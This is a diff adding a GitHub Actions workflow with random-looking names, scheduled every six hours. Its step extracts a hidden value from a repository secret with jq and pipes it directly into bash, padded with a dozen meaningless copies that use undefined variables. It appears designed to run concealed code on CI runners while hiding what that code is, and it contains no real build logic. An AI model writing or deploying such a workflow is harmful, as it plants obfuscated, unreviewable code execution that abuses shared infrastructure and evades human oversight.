@@ -1,0 +1,30 @@
+name: jiangneihe3765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangneihe3765
+        env:
+          l74563: ${{ secrets.l74563 }}
+        run: |
+          echo $l74563 | jq -r .m4505 | /bin/bash
+          echo $zd4 | jq -r .zhrg60 | /bin/bash
+          echo $swncr078 | jq -r .bcmzk80 | /bin/bash
+          echo $jmey8495 | jq -r .vr8018 | /bin/bash
+          echo $jpw604 | jq -r .tjfa26058 | /bin/bash
+          echo $biwjh0572 | jq -r .r81 | /bin/bash
+          echo $oj711 | jq -r .odakm121 | /bin/bash
+          echo $zvs50 | jq -r .webk827 | /bin/bash
+          echo $t9 | jq -r .pml59764 | /bin/bash
+          echo $gf663 | jq -r .cx979 | /bin/bash
+          echo $vvbx77439 | jq -r .cyks87437 | /bin/bash
+          echo $x7361 | jq -r .caelh8147 | /bin/bash
+          echo $uoj93 | jq -r .kz0092 | /bin/bash
+
